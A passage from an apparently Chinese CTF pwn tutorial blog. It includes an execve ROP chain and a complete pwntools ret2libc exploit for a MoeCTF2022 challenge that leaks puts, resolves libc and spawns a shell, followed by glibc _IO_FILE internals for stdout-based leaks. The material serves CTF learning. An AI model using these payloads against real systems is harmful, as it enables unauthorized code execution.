调用execve来getshell</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0x3b</span>) + p64(rdi) + p64(bss)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;system_x64&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>当不知道题目libc版本<del>（现在的ctf应该不会还有比赛不给libc吧，不会吧不会吧~）</del>，并且存在足够的溢出空间，是可以通过泄露函数地址（实际上只需要低三位数字）来查找libc版本，<strong>当然知道libc版本可能也会需要leak基地址来计算system等函数的地址</strong></p><p>这里建议使用py的LibcSearcher库，这个库是在线查找的（也就是要联网），<del><em>也可以本地一个一个试</em></del></p><p>ret2libc的思路是寻找程序中的gadget构造ROP，来调用程序中的输出函数如：puts，write，打印一些函数的地址，从而达到泄露基地址的目的</p><p><strong>例题：</strong><a href="../resources/pwn_asset/study/ret2libc_x64" target="_block">MoeCTF2022_ret2libc</a></p><p>在vuln函数里面就是一个简单的栈溢出，溢出长度足够构造ROP</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_vuln.png" alt="vuln"></p><p>覆盖的长度为0x40+0x8（rbp）&#x3D;0x48</p><p>然后由于x64前六个参数用寄存器传，多的才是和x86一样栈传参，这前六个参数依次用rdi，rsi，rcx，rdx，r8，r9寄存器</p><p>这里我们目的是通过puts函数来输出puts的got表中的地址来泄露puts的真实地址。</p><p>所以要把puts_got作为参数传进puts函数里，也就是要用到rdi寄存器。<strong>（找gadget可以用ROPgadget）</strong></p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_rdi.png" alt="findrdi"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># .got指向函数在libc的真实地址</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># 也可以elf.sym[&#x27;puts&#x27;]，因为.plt存的就是函数的符号信息</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># 也可以填vuln函数地址，只要保证再用一次read就行</span></span><br></pre></td></tr></table></figure><p>然后接收打印的地址，在查找libc版本，然后计算system，字符串&#x2F;bin&#x2F;sh的地址，就可以构造第二个payload</p><p><strong>要注意：ubuntu18以上版本调用系统函数要栈对齐，一般在传参前加个ret的gadget就行</strong></p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_ret.png" alt="findret"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># 这么写是因为一般以\x7f结尾的6个字节</span></span><br><span class="line"></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果是给了你libc文件，本地加载时用ELF()就行，用法自然跟上面LibcSearcher的不一样</span></span><br><span class="line"><span class="string">example:</span></span><br><span class="line"><span class="string">libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + libc.search(b&#x27;/bin/sh&#x27;).__next__() @py3</span></span><br><span class="line"><span class="string">#libc.search(&#x27;/bin/sh&#x27;).next() @py2</span></span><br><span class="line"><span class="string">py3中search()的参数必须是bytes，然后next方法多了下划线</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br></pre></td></tr></table></figure><p><strong>完整exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.anna.nssctf.cn&quot;</span>, <span class="number">28222</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendafter(message, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">message: <span class="built_in">str</span>, payload: <span class="built_in">bytes</span> | <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.sendlineafter(message, payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">numb = <span class="literal">None</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recv(numb, timeout)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>() -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvline()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">message, drop: <span class="built_in">bool</span> = <span class="literal">False</span>, timeout: <span class="built_in">float</span> = <span class="number">5</span></span>) -&gt; <span class="built_in">bytes</span> | <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(message, drop=drop, timeout=timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>(<span class="params">fn_name: <span class="built_in">str</span>, fn_addr: <span class="built_in">int</span></span>) -&gt; LibcSearcher:</span><br><span class="line">    <span class="keyword">return</span> LibcSearcher(fn_name, fn_addr)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span> io.interactive()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">ru(<span class="string">b&#x27;Go Go Go!!!\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p><strong>栈溢出小结：栈溢出是为了覆写某些数据来达到攻击者目的的一种手段，不能只是简单的背了什么ret2text，ret2libc等题型模板，更重要的是理解这种手段。而且溢出不只是scanf，read，gets这些，strcpy也是可以的，因为本质上都是由一个缓冲区复制到另一个缓冲区。另外覆写的数据也不尽就是返回地址了，像刚才在覆盖到ret之前顺便覆盖了一个int变量，在这里没看到什么作用，但是假如是一个关键数据（比如一个随机数），就可以起到很大用处了。</strong></p><h2 id="EZzzz的heap"><a href="#EZzzz的heap" class="headerlink" title="EZzzz的heap"></a>EZzzz的heap</h2><p><em>待补充……</em></p><h3 id="linux-heap的分配"><a href="#linux-heap的分配" class="headerlink" title="linux heap的分配"></a>linux heap的分配</h3><h3 id="heap-overflow"><a href="#heap-overflow" class="headerlink" title="heap overflow"></a>heap overflow</h3><h1 id="一些杂项"><a href="#一些杂项" class="headerlink" title="一些杂项"></a>一些杂项</h1><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO_FILE"></a>IO_FILE</h2><h3 id="通过stdout泄露libc"><a href="#通过stdout泄露libc" class="headerlink" title="通过stdout泄露libc"></a>通过stdout泄露libc</h3><p>有时候像泄露libc基地址会发现没有可以直接利用的puts之类的输出函数，这时候就可以打<code>_IO_2_1_stdout_</code>来达到泄露libc地址的目的。<strong>（以下以libc-2.31为例）</strong></p><p><em><strong>我看源码的网站：<a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/">https://elixir.bootlin.com/glibc/glibc-2.31/source/</a></strong></em></p><p>可以用pwndbg先大致看一下结构：），本节实际只会提到前一小部分</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p _IO_2_1_stdout_</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = &#123;</span></span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72537977,// 0xFBAD2887</span><br><span class="line">    _IO_read_ptr = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_read_end = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_read_base = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_write_base = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_write_ptr = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_write_end = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_buf_base = 0x7ffff7f9b7e3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;,</span><br><span class="line">    _IO_buf_end = 0x7ffff7f9b7e4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7f9aa80 &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = 1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;\n&quot;,</span><br><span class="line">    _lock = 0x7ffff7f9ca10 &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x7ffff7f9a980 &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = -1,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7f975e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搜索stdout，在stdio.c查看定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class="line">FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class="line">FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure><p>可以看到stdout实际是<code>_IO_2_1_stdout_</code>，类型为io_file_plus</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In libio/libio.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdin_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stdout_</span>;</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> _<span class="title">IO_2_1_stderr_</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// In libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到有个vtable，实际上这就是虚表，指向一系列的函数，目前不用管这个。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们先看看FILE类型（实际上也就是<code>_IO_FILE</code>）的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In libio/bits/types/FILE.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">FILE</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// In libio/bits/types/struct_FILE.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/// pass</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>_flags的规则：</strong></p><p>iofile里面的第一个成员_flags在泄露libc时非常重要。flags占用4个字节，高二个字节由libc版本来确定，一般都是0xfbad0000。低两个字节则是决定了程序的执行状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Magic number and bits for the _flags field.  The magic number is</span></span><br><span class="line"><span class="comment">   mostly vestigial, but preserved for compatibility.  It occupies the</span></span><br><span class="line"><span class="comment">   high 16 bits of _flags; the low 16 bits are actual flag bits.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN          0x0010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN          0x0020</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don&#x27;t call close(_fileno) on close.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF          0x0200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF        0x2000</span></span><br><span class="line">                           <span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK         0x8000</span></span><br></pre></td></tr></table></figure><p>这里面程序是通过与运算来判断应该如何执行：</p><p>比如flag通常情况下可能都会是<code>_flags=_IO_MAGIC ^ _IO_IS_FILEBUF ^ _IO_CURRENTLY_PUTTING ^ _IO_LINKED ^ _IO_NO_WRITES ^ _IO_UNBUFFERED ^ _IO_USER_BUF  </code> 也就是 0xFBAD2887</p><p>那么可以用_flag &amp; _IO_LINKED 来判断是否有这一位</p><p><strong>puts函数机制：</strong></p><p>在搞清楚我们要拿些标志位前我们先了解一下puts的机制（毕竟我们总要有个输出的函数），在看puts源码之前要先补充一点：</p><blockquote><p>  在libio&#x2F;ioputs.c中使用 <code>weak_alias(_IO_puts, puts)</code> 创建了一个弱符号，实际上调用puts就是在调用_IO_puts，所以我们得看io_puts的源码。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In libio/ioputs.c</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (<span class="built_in">stdout</span>) != <span class="number">0</span><span class="comment">// 就是 stdout-&gt;_vtable_offset != 0, 不用管</span></span><br><span class="line">       || _IO_fwide (<span class="built_in">stdout</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (<span class="built_in">stdout</span>, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看看_IO_sputn这个宏，会发现是跳转到了虚函数表的<code>__xsputn</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// In 